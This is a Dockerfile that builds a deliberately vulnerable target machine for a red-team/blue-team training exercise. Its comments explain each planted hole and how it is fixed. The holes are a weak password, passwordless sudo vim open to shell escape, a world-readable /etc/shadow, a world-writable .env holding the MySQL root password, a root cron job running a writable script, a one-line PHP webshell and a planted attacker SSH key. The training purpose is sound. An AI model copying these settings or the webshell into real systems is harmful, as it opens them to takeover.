FROM ubuntu:26.04

ENV DEBIAN_FRONTEND=noninteractive

# 一次裝好所有服務需要的東西 + 離線演練會用到的診斷/修補工具，
# 全部在 build 階段裝好，容器起來後不能再連網、不能再裝任何東西
RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        curl ca-certificates gnupg \
        nginx mysql-server mysql-client sudo cron supervisor \
        openssh-server openssh-client php-fpm \
        vim nano less grep findutils \
        iptables net-tools iproute2 tcpdump procps jq \
    && curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt-get install -y --no-install-recommends nodejs \
    && rm -rf /var/lib/apt/lists/*

# docker CLI（給隱藏關卡7用，走官方repo裝新版，跟target-dind的daemon版本對得起來，
# 理由跟blue-terminal的docker-ce-cli一樣：發行版內建的docker.io太舊會有API版本問題）
RUN install -m 0755 -d /etc/apt/keyrings \
    && curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc \
    && chmod a+r /etc/apt/keyrings/docker.asc \
    && echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu noble stable" > /etc/apt/sources.list.d/docker.list \
    && apt-get update \
    && apt-get install -y --no-install-recommends docker-ce-cli \
    && rm -rf /var/lib/apt/lists/*

# ---- app 程式碼 ----
COPY app/portal /opt/portal
COPY app/course-api /opt/course-api
COPY app/student-api /opt/student-api

RUN cd /opt/portal && npm install --omit=dev \
    && cd /opt/course-api && npm install --omit=dev \
    && cd /opt/student-api && npm install --omit=dev \
    && chown -R www-data:www-data /opt/portal /opt/course-api /opt/student-api

# ============================================================
# 靶機情境：user1 是紅隊的入口帳號（登入憑證 user1/user123）
# ============================================================
RUN useradd -m -s /bin/bash user1 \
    && echo "user1:user123" | chpasswd \
    && mkdir -p /var/run/sshd

# ---- 漏洞3：sudoers 允許 user1 免密碼跑 sudo vim（:!bash 逃逸提權）----
RUN printf 'user1 ALL=(root) NOPASSWD: /usr/bin/vim\n' > /etc/sudoers.d/user1_vuln \
    && chmod 440 /etc/sudoers.d/user1_vuln

# ---- 漏洞1：.env 外洩 MySQL root 明文密碼，權限777（owner設為www-data，呼應webserver的執行身份）----
RUN printf 'MYSQL_ROOT_PASSWORD=campus_root\nMYSQL_USER=campus\nMYSQL_PASSWORD=campus\n' > /opt/portal/.env \
    && chown www-data:www-data /opt/portal/.env \
    && chmod 777 /opt/portal/.env

# ---- 漏洞2：/etc/shadow 權限過寬（預設應為640/600，這裡故意設644）----
RUN chmod 644 /etc/shadow

# ---- 漏洞5：備份腳本777 + root crontab每分鐘執行 → 可被改寫成任意指令 ----
RUN mkdir -p /opt/scripts \
    && printf '#!/bin/bash\ntar czf /tmp/system_backup.tar.gz /opt/portal /opt/course-api /opt/student-api 2>/dev/null\n' > /opt/scripts/system_backup.sh \
    && chmod 777 /opt/scripts/system_backup.sh \
    && chown root:root /opt/scripts/system_backup.sh \
    && printf '* * * * * root /opt/scripts/system_backup.sh\n' > /etc/cron.d/system_backup \
    && chmod 644 /etc/cron.d/system_backup

# ---- 紅隊 web 入侵入口：webshell（www-data RCE，供紅隊 operation 用，藍隊規則上不能刪除）----
RUN mkdir -p /opt/webshell \
    && printf '<?php system($_GET["cmd"] ?? "id"); ?>\n' > /opt/webshell/.backdoor.php

# ---- 隱藏關卡6：SSH 持久化後門（root authorized_keys 植入攻擊者公鑰）----
# 紅隊拿到容器內 root（走漏洞3 或 5 提權）後，會在 /root/.ssh/authorized_keys 種一把
# 自己的公鑰當後門，確保下次不必重打一次 SQLi、重破一次密碼就能直接 ssh root 回來。
# 這題接在攻擊鏈「拿到 root」之後，是紅隊真實會做的下一步；藍隊的任務是事件應變的最後
# 一步：找出並清掉這把多餘的 key（持久化清除）。
#
# 比照隱藏關卡預埋假資料的做法：build 時就把「攻擊者」測試公鑰跟合法 root key 一起塞進
# authorized_keys，所以就算這場沒有真的紅隊、只是體驗場次，也永遠有一把後門可找、可清。
# 判定只看攻擊者那把 key 的金鑰材料在不在（見 scoring-engine/checker.py 的
# check_ssh_backdoor_removed，比對的 base64 blob 必須跟這裡的攻擊者公鑰逐字元一致）。
# 全程只是檔案讀寫，不需要 NET_ADMIN 或任何容器層級能力——徹底避開舊版關卡6
# 「webshell 鑑識＋iptables 封鎖」在座位容器沒有 NET_ADMIN 的死路（issue #152）。
#
# 合法 key 註解 root@target-box（校務管理者本來就有的 root 存取，藍隊應保留）；
# 攻擊者 key 註解 redteam@metis-persistence（紅隊植入的持久化後門，鑑識時要認出並清掉這把）。
RUN mkdir -p /root/.ssh \
    && printf '%s\n' \
        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE4gNLP69f9MCOuBreotLAAae9Gf7f1X3O60DMauObbm root@target-box' \
        'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAG/KdJzvE/WE7Ywf6rg0Xo2/8zhNGEQRG7BCQP1Ekz redteam@metis-persistence' \
        > /root/.ssh/authorized_keys \
    && chmod 700 /root/.ssh \
    && chmod 600 /root/.ssh/authorized_keys \
    && chown -R root:root /root/.ssh

# ---- 隱藏關卡7：容器逃逸（曝露的 docker socket，honeypot 版）----
# 一支內建的假 daemon（dind-honeypot.js）在 /var/run/dind/docker.sock 上監聽，重現
# 「容器內曝露了 docker socket」這個漏洞，不必再掛一個 DinD 沙盒容器（原 target-dind）。
# socket 設 root:root 0660，紅隊得先靠漏洞3或5 拿到容器內 root 才摸得到；
# 藍隊修法：rm -f /var/run/dind/docker.sock。判定不變（checker 打 docker version）。
COPY dind-honeypot.js /opt/honeypot/dind-honeypot.js

# ---- 分數查看：`score` 指令讀取host端checker.py推送進來的評分結果 ----
RUN mkdir -p /opt/score
COPY score.sh /usr/local/bin/score
RUN chmod +x /usr/local/bin/score

# ---- nginx ----
COPY nginx.conf /etc/nginx/nginx.conf

# ---- MySQL 記憶體精簡設定：讓 target-box 塞進 --memory=512m（見 mysql-lean.cnf）----
COPY mysql-lean.cnf /etc/mysql/mysql.conf.d/zz-lean.cnf

# ---- db 初始化腳本 ----
COPY db/schema.sql /opt/db/schema.sql
COPY db/seed.sql /opt/db/seed.sql

# ---- supervisor：統一管理 mysqld / nginx / 三個 node 服務 ----
COPY supervisord.conf /etc/supervisor/conf.d/target-box.conf

# ---- entrypoint：第一次開機時初始化 MySQL schema，之後交給 supervisord ----
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh \
    && mkdir -p /var/log/supervisor

EXPOSE 80 22

CMD ["/entrypoint.sh"]
